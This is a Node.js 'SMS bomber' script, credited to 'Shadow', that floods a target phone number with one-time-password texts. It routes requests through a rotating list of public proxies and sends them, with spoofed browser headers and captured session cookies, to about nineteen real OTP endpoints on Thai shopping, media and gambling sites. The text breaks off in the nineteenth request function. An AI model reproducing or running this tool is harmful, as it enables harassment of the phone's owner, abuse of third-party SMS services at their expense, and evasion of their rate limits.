require('events').EventEmitter.defaultMaxListeners = 0;
const axios = require("axios"),
    randomstring = require("randomstring"),
    qs = require('qs'),
    HttpsProxyAgent = require('https-proxy-agent');

(async function () {
    if (process.argv.length !== 4) {
	console.log(`
╔═╗╦ ╦╔═╗╔╦╗╔═╗╦ ╦  ╔╦╗╔═╗╦╔═
╚═╗╠═╣╠═╣ ║║║ ║║║║   ║ ╠═╣╠╩╗
╚═╝╩ ╩╩ ╩═╩╝╚═╝╚╩╝   ╩ ╩ ╩╩ ╩`)

console.log("Spam Sms By: Shadow ")
console.log("node sms.js (phone) (count)")
        process.exit(0);
    } else {
        const phonenumber = process.argv[2],
            count = process.argv[3];
        const proxyscrape = await axios.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt');
        const proxies = proxyscrape.data.replace(/\r/g, '').split('\n');
        var countting = 0;
        const formUrlEncoded = x => Object.keys(x).reduce((p, c) => p + `&${c}=${encodeURIComponent(x[c])}`, '')
        // function sleep(ms) {return new Promise((resolve) => {setTimeout(resolve, ms)})};
        function randomnumber(length) {
            var result = '';
            var characters = '123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }
        function randomstr(length) {
            var result = '';
            var characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        // API 1
        async function bfhmscapi1() {
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            let agent = new HttpsProxyAgent('http://' + proxy); 
            let phone = phonenumber;  
        
            const url = 'https://openapi.bigc.co.th/customer/v1/otp';
            const headers = {
                'Content-Type': 'application/json'
            };
        
            const payload = {
                "phone_no": phone
            };
            try {
                let response = await fetch(url, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify(payload),
                    agent: agent  
                });
                if (response.ok) {
                    console.log("BFHMSC API 1 SEND");
                    countting++;
                } else {
                    console.log("Error");
                }
            } catch (e) {
                console.log("Error");
            }
        }

        // API 2
        async function bfhmscapi2() {
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            let agent = new HttpsProxyAgent('http://' + proxy);  
            let phone = phonenumber;  
            
            try {
                const vbase_url = "https://www.ctrueshop.com/member.php";
                const headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cookie": "PHPSESSID=49oiv991cst8ag13g2q3o0h012; rwidget_referrer=https%3A//www.google.com/; rwidget_landing_url=https%3A//www.ctrueshop.com/; rwidget_gclid=; rwidget_fbclid=; rwidget_utm_source=; rwidget_utm_medium=; rwidget_utm_campaign=; _gid=GA1.2.501146712.1723453186; _gcl_au=1.1.1859540524.1723453189; cc_cookie={\"categories\":[\"necessary\",\"analytics\",\"targeting\"],\"level\":[\"necessary\",\"analytics\",\"targeting\"],\"revision\":0,\"data\":null,\"rfc_cookie\":false,\"consent_date\":\"2024-08-12T09:00:25.878Z\",\"consent_uuid\":\"73171a37-192e-4754-8b95-05a905932e4d\",\"last_consent_update\":\"2024-08-12T09:00:25.878Z\"}; _gat_gtag_UA_19183081_1=1; _ga_GE5TK3GPM1=GS1.1.1723453179.1.1.1723453329.46.0.0; _ga=GA1.2.581529113.1723453180; rwidget_submit_url=https%3A//www.ctrueshop.com/member.php%3Fpage%3D30%26type%3D9",
                    "Referer": "https://www.ctrueshop.com/member.php?page=30&type=9",
                    "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": "\"Windows\"",
                    "Sec-Fetch-Dest": "document",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-User": "?1",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
                };
                const params = new URLSearchParams({
                    "page": "25",
                    "tel1": phone,
                    "type": "9",
                    "success": "1"
                });
                let response = await fetch(`${vbase_url}?${params.toString()}`, {
                    method: 'GET',
                    headers: headers,
                    agent: agent  
                });
        
                if (response.ok) {
                    console.log("BFHMSC API 2 SEND");
                    countting++;
                } else {
                    console.log("Error");
                }
        
            } catch (e) {
                console.log("Error");
            }
        }

        // API 3
        async function bfhmscapi3() {
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            let agent = new HttpsProxyAgent('http://' + proxy);  
            let phone = phonenumber;  
            const url = "https://api-sso.ch3plus.com/user/request-otp";
        
            const payload = {
                "tel": phone,
                "type": "login"
            };
        
            const headers = {
                "Content-Type": "application/json"
            };
        
            try {
                let response = await fetch(url, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify(payload),
                    agent: agent  
                });
        
                if (response.ok) {
                    console.log("BFHMSC API 3 SEND");
                    countting++; 
                } else {
                    console.log("Error");
                }
        
            } catch (e) {
                console.log("Error");
            }
        }

        // API 4
        function bfhmscapi4() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);  
        
            const url = "https://www.xn--159-pklo7i1bpv9e1krf.com/api/auth/otp-guest-request";
            const headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/json",
                "Cookie": "HstCfa4581208=1723378970475; HstCmu4581208=1723378970475; HstCnv4581208=1; HstCns4581208=1; c_ref_4581208=https%3A%2F%2Fwww.google.com%2F; _gcl_au=1.1.427078926.1723378971; HstCla4581208=1723378977162; HstPn4581208=4; HstPt4581208=4",
                "Origin": "https://www.xn--159-pklo7i1bpv9e1krf.com",
                "Referer": "https://www.xn--159-pklo7i1bpv9e1krf.com/signup",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Ch-Ua-Platform-Version": '"10.0.0"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                "X-User-Id": "a52325e6-45d2-4b43-9597-2c6f24448183"
            };
        
            const payload = {
                "phone": phone,
                "ref_id": null,
                "type": "register"
            };
        
            fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(payload),
                agent: agent  
            })
            .then(response => {
                if (response.ok) {
                    console.log("BFHMSC API 4 SEND");
                } else {
                    console.log("Error");
                }
            })
            .catch(error => {
                console.log("Error");
            });
        }

        // API 5
        function bfhmscapi5() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);  
            const url = "https://play.legacybet888s.com/lobby-api/auth/register/phone/validate";
            const headers = {
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json",
                "Agent-Code": "FYDB",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                "Origin": "https://play.legacybet888s.com",
                "Referer": "https://play.legacybet888s.com/register",
                "Cookie": "_ga_HQ35QY5083=GS1.1.1723437043.1.0.1723437043.0.0.0; _ga=GA1.1.824479695.1723437044; agent=%7B%22id%22%3A73%2C%22parent_agent_id%22%3A38%2C%22agent_code%22%3A%22FYDB%22%2C%22agent_name%22%3A%22legacybet88%22%2C%22logo%22%3Anull%2C%22logo2%22%3Anull%2C%22favicon%22%3Anull%2C%22domain%22%3A%22legacybet888s.com%22%2C%22domain_lobby%22%3A%22play.legacybet888s.com%22%2C%22link_line%22%3A%22%22%2C%22line_id%22%3A%22%22%2C%22live_chat_cid%22%3A%22%22%2C%22loading_game_image%22%3A%22%22%2C%22is_lobby_minigame%22%3A1%2C%22country%22%3A%22TH%22%2C%22agent_type%22%3A%22normal%22%2C%22is_api_ma%22%3A0%2C%22is_webadmin_ma%22%3A0%2C%22is_lobby_ma%22%3A0%7D; agentcode=FYDB; livechat_identifier=YTAxYmI1MS1mZDU2LTNkYzgtNTZiZC03M2U1N2FmODhmMmQ%3D; _clck=11lqbh2%7C2%7Cfo9%7C0%7C1685; _clsk=p10bif%7C1723437049191%7C1%7C0%7Cr.clarity.ms%2Fcollect"
            };
            const data = {
                "phone": phone,
                "ref_code": "",
                "captcha_token": ""
            };
            fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(data),
                agent: agent 
            })
            .then(response => {
                if (response.ok) {
                    console.log("BFHMSC API 5 SEND");
                } else {
                    console.log("Error");
                }
            })
            .catch(error => {
                console.log("Error");
            });
        }
            
        // API 6
        function bfhmscapi6() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);  
            const url = "https://api-players.cueu77778887.com/register-otp";
            const headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "th-TH,th;q=0.9",
                "Authorization": "Bearer null",
                "Cache-Control": "no-cache",
                "Content-Type": "application/json",
                "Expires": "0",
                "Origin": "https://mc888auto.electrikora.com",
                "Pragma": "no-cache",
                "Referer": "https://mc888auto.electrikora.com/",
                "Sec-CH-UA": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
                "Sec-CH-UA-Mobile": "?0",
                "Sec-CH-UA-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
                "X-Exp-Signature": "619b16e785902c00189448e8",
                "X-White-Lable-Name": "cm"
            };
            const payload = {
                "brands_id": "619b16e785902c00189448e8",
                "tel": phone,
                "token": "",
                "captcha_id": "",
                "captcha_output": "",
                "gen_time": "",
                "lot_number": "",
                "pass_token": "",
            };
            fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(payload),
                agent: agent  
            })
            .then(response => {
                if (response.ok) {
                    console.log("BFHMSC API 6 SEND");
                } else {
                    console.log("Error");
                }
            })
            .catch(error => {
                console.log("Error");
            });
        }

        // API 7
        function bfhmscapi7() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy); 
            const url = "https://api.giztix.com/graphql";
            const headers = {
                "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                "Content-Type": "application/json"  
            };
            const payload = {
                "operationName": "OtpGeneratePhone",
                "variables": {
                    "phone": `66${phone.slice(1)}`  
                },
                "query": "mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"
            };
            fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(payload),
                agent: agent  
            })
            .then(response => {
                if (response.ok) {
                    return response.json(); 
                } else {
                    console.log("Error: ", response.status);
                    throw new Error("Network response was not ok.");
                }
            })
            .then(data => {
                console.log("BFHMSC API 7 SEND");
            })
            .catch(error => {
                console.log("Error");
            });
        }

        // API 8
        async function bfhmscapi8() {
            var phone = phonenumber;
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);
        
            let url = "https://service.fast888.bio/api/user/request-otp";
        
            let headers = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/json;charset=UTF-8',
                'Origin': 'https://fast888.bio',
                'Referer': 'https://fast888.bio/',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            }
        
            let payload = {
                "phone": phone
            };
        
            try {
                console.log("BFHMSC API 8 SEND");
        
                const response = await axios.post(url, payload, {
                    headers: headers,
                    httpsAgent: agent
                });
        
                console.log(response.data);
            } catch (error) {
                console.error('Error sending OTP request');
            }
        }

        // API 9
        async function bfhmscapi9() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);
            const url = "https://api2.1112.com/api/v1/otp/create";
            const headers = {
                "accept": "application/json, text/plain, */*",
                "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
            };
            const payload = {
                "phonenumber": phone,
                "language": "th"
            };
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify(payload),
                    agent: agent  
                });
                const responseData = await response.json();
                console.log(response.status);
                console.log(responseData);
        
                if (response.ok) {
                    console.log("BFHMSC API 9 SEND");
                } else {
                    console.log("Error");
                }
            } catch (error) {
                console.log("Error");
            }
        }

        // API 10
        async function bfhmscapi10() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);
            const url = "https://api.88bac8call.xyz/AuthService/RequestOtp";
            const headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "th-TH,th;q=0.9,en;q=0.8",
                "Content-Type": "application/json",
                "Origin": "https://baccarat888th.com",
                "Referer": "https://baccarat888th.com/",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
            };
            const payload = {
                "phone": phone
            };
        
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify(payload),
                    agent: agent  
                });
        
                const responseData = await response.json();
                console.log(response.status);
                console.log(responseData);
        
                if (response.ok) {
                    console.log("BFHMSC API 10 SEND");
                } else {
                    console.log("Error");
                }
            } catch (error) {
                console.log("Error");
            }
        }
            
        async function bfhmscapi11() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);
            const url = "https://u-auth.24slg.tech/v1/auth/otp-req";
            const headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/json",
                "Origin": "https://24fix.co",
                "Referer": "https://24fix.co/",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
            };
            const payload = {
                "phoneNumber": phone
            };
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify(payload),
                    agent: agent  
                });
                const responseData = await response.json();
                console.log(response.status);
                console.log(responseData);
                if (response.ok) {
                    console.log("BFHMSC API 11 SEND");
                } else {
                    console.log("Error");
                }
            } catch (error) {
                console.log("Error");
            }
        }

        // API 12
        async function bfhmscapi12() {
            var phone = phonenumber;  
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);
            if (phone.startsWith("0")) {
                phone = phone.slice(1); 
            }
            const url = "https://www.drivehub.com/api/v2/auth/otp/request";
            const headers = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/json',
                'Origin': 'https://www.drivehub.com',
                'Referer': 'https://www.drivehub.com/th/user/register',
                'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'Sec-Ch-Ua-Mobile': '?1',
                'Sec-Ch-Ua-Platform': '"Android"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
                'Cookie': '_where=https://www.drivehub.com/th/user/register; _gcl_au=1.1.1047731730.1723116743; _ga=GA1.2.262980323.1723116744; _gid=GA1.2.9817805.1723116744; _dc_gtm_UA-83410238-1=1; _fbp=fb.1.1723116744518.649811062454409756; __lt__cid=1a9219f7-90f7-4422-acaf-3b3e57ed4889; __lt__sid=5352d5d1-0e3062a9; _tt_enable_cookie=1; _ttp=ac4OTZJF2ynREotelro45cqSQKm; _ga_7981TZHSXM=GS1.1.1723116743.1.1.1723116751.52.1.721777383'
            };
            const payload = {
                "username": `+66${phone}` 
            };
        
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: headers,
                    body: JSON.stringify(payload),
                    agent: agent  
                });
        
                const responseData = await response.json();
                console.log(response.status);
                console.log(responseData);
        
                if (response.ok) {
                    console.log("BFHMSC API 12 SEND");
                } else {
                    console.log("Error");
                }
            } catch (error) {
                console.log("Error");
            }
        }

        // API 13
        function bfhmscapi13() {
            var phone = phonenumber; 
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);
        
            var url = "https://api-players.cueu77778887.com/register-otp";
            var headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": "Bearer null",
                "Cache-Control": "no-cache",
                "Content-Type": "application/json",
                "Expires": "0",
                "Origin": "https://m.go98g.com",
                "Pragma": "no-cache",
                "Priority": "u=1, i",
                "Referer": "https://m.go98g.com/",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                "X-Exp-Signature": "6639d0e89a9e9300125ae760",
                "X-White-Lable-Name": "cm"
            };
        
            var payload = {
                "brands_id": "6639d0e89a9e9300125ae760",
                "tel": phone,
                "token": "",
                "captcha_id": "",
                "lot_number": "",
                "pass_token": "",
                "gen_time": "",
                "captcha_output": ""
            };
            const config = {
                method: 'post',
                url: url,
                headers: headers,
                data: payload,
                httpsAgent: agent
            };
            axios(config)
                .then(function (response) {
                    console.log("BFHMSC API 13 SEND");
                    countting++; 
                })
                .catch(function (error) {
                    console.error("Error"); 
                });
        }

        // API 14
        function bfhmscapi14() {
            var phone = phonenumber; 
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);
            var url = "https://autorich99u.com/ajax/getOtp";
            var headers = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Cookie": "atb_atr=ihlccpcs97ne0u2f64mniju6c49jsadf",
                "Origin": "https://autorich99u.com",
                "Referer": "https://autorich99u.com/player/register",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest"
            };
            var data = new URLSearchParams(); 
            data.append("mobile_no", phone);
            const config = {
                method: 'post',
                url: url,
                headers: headers,
                data: data,
                httpsAgent: agent 
            };
            axios(config)
                .then(function (response) {
                    console.log("BFHMSC API 14 SEND");
                    countting++;
                })
                .catch(function (error) {
                    console.error("Error"); 
                });
        }

            
        function bfhmscapi15() {
            var phone = phonenumber; 
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);
            var url = "https://service.fd888.org/api/user/request-otp";
            var headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Access-Control-Allow-Credentials": "true",
                "Access-Control-Allow-Headers": "Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With",
                "Access-Control-Allow-Methods": "DELETE, POST, GET, PUT",
                "Access-Control-Allow-Origin": "*",
                "Content-Type": "application/json;charset=UTF-8",
                "Origin": "https://fd888.org",
                "Referer": "https://fd888.org/",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
            };
            var payload = {
                "phone": phone
            };
            const config = {
                method: 'post',
                url: url,
                headers: headers,
                data: JSON.stringify(payload), 
                httpsAgent: agent 
            };

            axios(config)
                .then(function (response) {
                    console.log("BFHMSC API 15 SEND");
                    countting++; 
                })
                .catch(function (error) {
                    console.error("Error"); 
                });
        }

        // API 16
        function bfhmscapi16() {
            var phone = phonenumber; 
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);
            var url = "https://gb-789.com/api/tiamut/otp";
            var headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "th",
                "Content-Type": "application/json",
                "Cookie": "i18n_redirected=th; marketingID=66c9860b31fc4cf5f5d32abc; __cf_bm=Gua88s73dW.Eb8qPjLi5YGSssAXlL9SJxXfhoEW7tj4-1726239891-1.0.1.1-AOoevxw3NV3GGfT2VBpO3v4mRB5YsQBFnFfpND18tc6hEhBVxhK9wqZu.xQ65wf8JV8m2ZzcQml3xDD6vEoNg; _cfuvid=wJn4k8g4kYDIWhbkVVNWQGeiFF83_N48BcV1ASj1M3s-1726239891512-0.0.1.1-604800000",
                "My-Domain": "gb-789.com",
                "Origin": "https://gb-789.com",
                "Referer": "https://gb-789.com/?action=register&marketingRef=66c9860b31fc4cf5f5d32abc",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            };
            var data = {
                "phone": phone
            };
            const config = {
                method: 'post',
                url: url,
                headers: headers,
                data: JSON.stringify(data), 
                httpsAgent: agent
            };
            axios(config)
                .then(function (response) {
                    console.log("BFHMSC API 16 SEND");
                    countting++; 
                })
                .catch(function (error) {
                    console.error("Error"); 
                });
        }
        
        // API 17
        function bfhmscapi17() {
            var phone = phonenumber; 
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);
            var url = "https://semi.devh5apihwp3o6.com/api/h5/otp/request";
            var headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "th",
                "Content-Type": "application/json",
                "Origin": "https://www.changbet789.com",
                "Referer": "https://www.changbet789.com/",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                "X-Token": undefined, 
                "X-Userid": undefined, 
            };
    
            var payload = {
                "isEncrypt2161": "N",
                "data": {
                    "mobileNumber": phone,
                    "check": "yes"
                }
            };
        
           
            const config = {
                method: 'post',
                url: url,
                headers: headers,
                data: JSON.stringify(payload), 
                httpsAgent: agent 
            };
        

            axios(config)
                .then(function (response) {
                    console.log("BFHMSC API 17 SEND");
                    countting++; 
                })
                .catch(function (error) {
                    console.error("Error"); 
                });
        }

        // API 18
        function bfhmscapi18() {
            var phone = phonenumber; 
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);
            var url = "https://api.naja168.com/yorkky/RequestOTP";
            var headers = {
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Origin": "https://m.naja168.com",
                "Referer": "https://m.naja168.com/",
                "Sec-Ch-Ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": '"Windows"',
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
            };
            var data = new URLSearchParams({
                "csrf_test_name": "6a43f0b543522ecc2f0085acb00d1686", 
                "TEL": phone,
                "UPLINE_TOKEN": "31944MWUu", 
                "lang": "th",
                "who": ""
            }).toString(); 
            const config = {
                method: 'post',
                url: url,
                headers: headers,
                data: data, 
                httpsAgent: agent 
            };
            axios(config)
                .then(function (response) {
                    console.log("BFHMSC API 18 SEND");
                    countting++; 
                })
                .catch(function (error) {
                    console.error("Error"); 
                });
        }

        // API 19
        function bfhmscapi19() {
            var phone = phonenumber; 
            let proxy = proxies[Math.floor(Math.random() * proxies.length)];
            var agent = new HttpsProxyAgent('http://' + proxy);
            if (phone.startsWith("0")) {
                phone = phone.substring(1); 
            }
            var url = "https://api.zabbet.com/lobby/auth/register/phone/validate";
            var headers = {
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "en-US,en;q=0.9",
                "Agent-Code": "Y0NG",
                "Authorization": "Bearer", 
                "Content-Type": "application/json",
                "Origin": "https://qstar168.com",
                "Referer": "https://qstar168.com/",
                "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
                "Sec-Ch-Ua-Mobile": "?0",
                "Sec-Ch-Ua-Platform": "\"Windows\"",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "cross-site",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
            };
            var payload = {
                "phone": `+66${phone}`, 
                "ref_code": "", 
                "captcha_token": "" 
            };
            const config = {
                method: 'post',
                url: url,
                headers: headers,
                data: JSON.stringify(payload), 
